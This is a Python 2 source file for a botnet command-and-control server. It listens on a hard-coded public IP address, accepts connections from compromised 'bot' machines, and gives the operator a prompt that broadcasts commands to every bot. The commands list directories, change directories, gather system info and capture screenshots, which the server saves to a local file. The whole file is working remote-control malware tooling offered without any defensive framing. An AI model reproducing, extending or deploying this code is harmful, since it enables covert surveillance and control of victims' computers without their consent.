import socket
from threading import *
from time import sleep

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "45.55.59.112"
port = 8000
print host
print port
serversocket.bind((host, port))
serversocket.listen(5)
print 'server started and listening'
lock = Lock()


class Bot(Thread):
    def __init__(self, socket, address):
	Thread.__init__(self)
	self.daemon = True
        self.sock = socket
        self.addr = address
	self.last_message = ''
	self.received = False
	self.screen_capping = False
	self.start()

    def execute_command(self, cmd):
        self.received = False
	self.last_message = ''
	self.sock.send(cmd)
	if cmd == 'scrn':
	    self.screen_capping = True
	    screen_cap = open('cap', 'w')
	    while not self.received:
		pass
	    screen_cap.write(self.last_message)
	
    def run(self):
	while True:
	    message = ''
	    while 'EOF' not in message:
                message += self.sock.recv(4096)
            message = message[:-3]
	    if not self.screen_capping:
	    	print 'Bot', self.addr, '\n' + message.decode()
 	    else:
		self.screen_capping = False
	    self.last_message = message
	    self.received = True


class Controller(Thread):
    def __init__(self):
        Thread.__init__(self)
	self.daemon = True
	self.bots= []
 	self.start()

    def run(self):
	while True:
	    clientsocket, address = serversocket.accept()
	    self.bots.append(Bot(clientsocket, address))
	    

controller = Controller()
while True:
    cmd = ''
    raw_input()  # press enter
    with lock:
        cmd = raw_input("control$ ")
    
    valid_cmd = False
    if (cmd == 'ls' or cmd.split(' ')[0] == 'cd' or cmd == 'pwd' or
        cmd == 'info' or cmd == 'scrn'):
	valid_cmd = True
	
    if valid_cmd:
        for bot in controller.bots:
            bot.execute_command(cmd)
	    sleep(2)
	
